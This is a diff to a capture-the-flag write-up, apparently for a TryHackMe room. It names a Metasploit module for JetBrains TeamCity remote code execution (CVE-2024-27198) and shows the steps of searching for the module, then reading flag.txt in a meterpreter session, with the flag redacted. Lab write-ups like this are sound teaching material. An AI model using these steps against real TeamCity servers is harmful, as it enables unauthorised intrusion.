@@ -37,7 +37,7 @@ msfconsole
 search teamcity
 ```
 1. "search teamcity" -> This will list available exploit modules related to TeamCity
-2. Look for one like: exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
+*Look for one like: exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198*
 
 #  Use the module:
 ```bash
@@ -78,5 +78,12 @@ ls
 ```bash
 cat flag.txt
 ```
+![Nmap Scan](Brain%20Room%20flag.JPG)
 
+# For ethical and platform policy reasons, I cannot display the actual contents of the flag.txt file.
+*Instead, here is a simulated example of what the output would look like:*
 
+```bash
+meterpreter > cat flag.txt
+THM{redacted_for_policy}
+```
